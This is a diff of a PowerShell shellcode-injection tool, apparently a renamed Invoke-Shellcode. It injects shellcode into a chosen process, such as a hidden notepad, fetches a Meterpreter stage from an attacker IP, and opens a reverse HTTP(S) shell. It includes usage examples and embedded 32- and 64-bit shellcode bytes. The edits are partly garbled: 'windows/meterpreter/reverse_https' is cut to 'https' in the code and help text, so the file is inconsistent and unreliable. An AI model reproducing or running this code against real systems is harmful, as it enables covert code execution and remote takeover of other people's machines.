@@ -41,7 +41,7 @@ Portions of this project was based upon syringe.c v1.2 written by Spencer McInty
 
 PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):
 
-msfP windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
+msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
 
 Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
  
@@ -53,9 +53,9 @@ Process ID of the process you want to inject shellcode into.
 
 Specifies an optional shellcode passed in as a byte array
 
-.PARAMETER ListMetasploitPs
+.PARAMETER ListMetasploitPayloads
 
-Lists all of the available Metasploit Ps that shell supports
+Lists all of the available Metasploit payloads that shell supports
 
 .PARAMETER H
 
@@ -65,13 +65,13 @@ Specifies the IP address of the attack machine waiting to receive the reverse sh
  
 Specifies the port of the attack machine waiting to receive the reverse shell
 
-.PARAMETER P
+.PARAMETER Payload
 
-Specifies the metasploit P to use. Currently, only 'windows/meterpreter/reverse_http' and 'windows/meterpreter/reverse_https' Ps are supported.
+Specifies the metasploit payload to use. Currently, only 'windows/meterpreter/reverse_http' and 'https' payloads are supported.
 
 .PARAMETER UserAgent
 
-Optionally specifies the user agent to use when using meterpreter http or https Ps
+Optionally specifies the user agent to use when using meterpreter http or https payloads
 
 .PARAMETER Force
 
@@ -97,9 +97,9 @@ Inject shellcode into the running instance of PowerShell.
 
 C:\PS> Start-Process C:\Windows\SysWOW64\notepad.exe -WindowStyle Hidden
 C:\PS> $Proc = Get-Process notepad
-C:\PS> shell -ProcessId $Proc.Id -P windows/meterpreter/reverse_https -H 192.168.30.129 -O 443 -Verbose
+C:\PS> shell -ProcessId $Proc.Id -Payload https -H 192.168.30.129 -O 443 -Verbose
 
-VERBOSE: Requesting meterpreter P from https://192.168.30.129:443/INITM
+VERBOSE: Requesting meterpreter payload from https://192.168.30.129:443/INITM
 VERBOSE: Injecting shellcode into PID: 4004
 VERBOSE: Injecting into a Wow64 process.
 VERBOSE: Using 32-bit shellcode.
@@ -110,9 +110,9 @@ VERBOSE: Shellcode injection complete!
 
 Description
 -----------
-Establishes a reverse https meterpreter P from within the hidden notepad process. A multi-handler was set up with the following options:
+Establishes a reverse https meterpreter payload from within the hidden notepad process. A multi-handler was set up with the following options:
 
-P options (windows/meterpreter/reverse_https):
+Payload options (https):
 
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
@@ -122,13 +122,13 @@ O     443              yes       The local listener port
 
 .EXAMPLE
 
-C:\PS> shell -P windows/meterpreter/reverse_https -H 192.168.30.129 -O 80
+C:\PS> shell -Payload https -H 192.168.30.129 -O 80
 
 Description
 -----------
-Establishes a reverse http meterpreter P from within the running PwerShell process. A multi-handler was set up with the following options:
+Establishes a reverse http meterpreter payload from within the running PwerShell process. A multi-handler was set up with the following options:
 
-P options (windows/meterpreter/reverse_http):
+Payload options (windows/meterpreter/reverse_http):
 
 Name      Current Setting  Required  Description
 ----      ---------------  --------  -----------
@@ -147,12 +147,12 @@ Warning: This script has no way to validate that your shellcode is 32 vs. 64-bit
     
 .EXAMPLE
 
-C:\PS> shell -ListMetasploitPs
+C:\PS> shell -ListMetasploitPayloads
     
-Ps
+Payloads
 --------
 windows/meterpreter/reverse_http
-windows/meterpreter/reverse_https
+https
 
 .NOTES
 
@@ -179,14 +179,14 @@ http://www.exploit-monday.com
     
     [Parameter( ParameterSetName = 'Metasploit' )]
     [ValidateSet( 'windows/meterpreter/reverse_http',
-                  'windows/meterpreter/reverse_https',
+                  'https',
                   IgnoreCase = $True )]
     [String]
-    $P = 'windows/meterpreter/reverse_http',
+    $Payload = 'windows/meterpreter/reverse_http',
     
-    [Parameter( ParameterSetName = 'ListPs' )]
+    [Parameter( ParameterSetName = 'ListPayloads' )]
     [Switch]
-    $ListMetasploitPs,
+    $ListMetasploitPayloads,
     
     [Parameter( Mandatory = $True,
                 ParameterSetName = 'Metasploit' )]
@@ -211,15 +211,15 @@ http://www.exploit-monday.com
 
     Set-StrictMode -Version 2.0
     
-    # List all available Metasploit Ps and exit the function
-    if ($PsCmdlet.ParameterSetName -eq 'ListPs')
+    # List all available Metasploit payloads and exit the function
+    if ($PsCmdlet.ParameterSetName -eq 'ListPayloads')
     {
-        $AvailablePs = (Get-Command shell).Parameters['P'].Attributes |
+        $AvailablePayloads = (Get-Command shell).Parameters['Payload'].Attributes |
             Where-Object {$_.TypeId -eq [System.Management.Automation.ValidateSetAttribute]}
     
-        foreach ($P in $AvailablePs.ValidValues)
+        foreach ($Payload in $AvailablePayloads.ValidValues)
         {
-            New-Object PSObject -Property @{ Ps = $P }
+            New-Object PSObject -Property @{ Payloads = $Payload }
         }
         
         Return
@@ -291,7 +291,7 @@ http://www.exploit-monday.com
         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
     }
 
-    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode P
+    # Emits a shellcode stub that when injected will create a thread and pass execution to the main shellcode payload
     function Local:Emit-CallThreadStub ([IntPtr] $BaseAddr, [IntPtr] $ExitThreadAddr, [Int] $Architecture)
     {
         $IntSizePtr = $Architecture / 8
@@ -549,7 +549,7 @@ http://www.exploit-monday.com
     if ($PsCmdlet.ParameterSetName -eq 'Metasploit')
     {
         if (!$PowerShell32bit) {
-            # The currently supported Metasploit Ps are 32-bit. This block of code implements the logic to execute this script from 32-bit PowerShell
+            # The currently supported Metasploit payloads are 32-bit. This block of code implements the logic to execute this script from 32-bit PowerShell
             # Get this script's contents and pass it to 32-bit powershell with the same parameters passed to this function
 
             # Pull out just the content of the this script's invocation.
@@ -557,12 +557,12 @@ http://www.exploit-monday.com
 
             $Response = $True
         
-            if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you want to launch the P from x86 Powershell?",
+            if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you want to launch the payload from x86 Powershell?",
                    "Attempt to execute 32-bit shellcode from 64-bit Powershell. Note: This process takes about one minute. Be patient! You will also see some artifacts of the script loading in the other process." ) ) ) { }
         
             if ( !$Response )
             {
-                # User opted not to launch the 32-bit P from 32-bit PowerShell. Exit function
+                # User opted not to launch the 32-bit payload from 32-bit PowerShell. Exit function
                 Return
             }
 
@@ -591,22 +591,22 @@ http://www.exploit-monday.com
         $Response = $True
         
         if ( $Force -or ( $Response = $psCmdlet.ShouldContinue( "Do you know what you're doing?",
-               "About to download Metasploit P '$($P)' H=$($H), O=$($O)" ) ) ) { }
+               "About to download Metasploit payload '$($Payload)' H=$($H), O=$($O)" ) ) ) { }
         
         if ( !$Response )
         {
-            # User opted not to carry out download of Metasploit P. Exit function
+            # User opted not to carry out download of Metasploit payload. Exit function
             Return
         }
         
-        switch ($P)
+        switch ($Payload)
         {
             'windows/meterpreter/reverse_http'
             {
                 $SSL = ''
             }
             
-            'windows/meterpreter/reverse_https'
+            'https'
             {
                 $SSL = 's'
                 # Accept invalid certificates
@@ -616,7 +616,7 @@ http://www.exploit-monday.com
         
         # Meterpreter expects 'INITM' in the URI in order to initiate stage 0. Awesome authentication, huh?
         $Request = "http$($SSL)://$($H):$($O)/INITM"
-        Write-Verbose "Requesting meterpreter P from $Request"
+        Write-Verbose "Requesting meterpreter payload from $Request"
         
         $Uri = New-Object Uri($Request)
         $WebClient = New-Object System.Net.WebClient
@@ -645,8 +645,8 @@ http://www.exploit-monday.com
         # Pop a calc... or whatever shellcode you decide to place in here
         # I sincerely hope you trust that this shellcode actually pops a calc...
         # Insert your shellcode here in the for 0xXX,0xXX,...
-        # 32-bit P
-        # msfP windows/exec CMD="cmd /k calc" EXITFUNC=thread
+        # 32-bit payload
+        # msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread
         [Byte[]] $Shellcode32 = @(0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,
                                   0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,
                                   0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,
@@ -661,8 +661,8 @@ http://www.exploit-monday.com
                                   0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x63,
                                   0x61,0x6c,0x63,0x00)
 
-        # 64-bit P
-        # msfP windows/x64/exec CMD="calc" EXITFUNC=thread
+        # 64-bit payload
+        # msfpayload windows/x64/exec CMD="calc" EXITFUNC=thread
         [Byte[]] $Shellcode64 = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                   0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                   0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
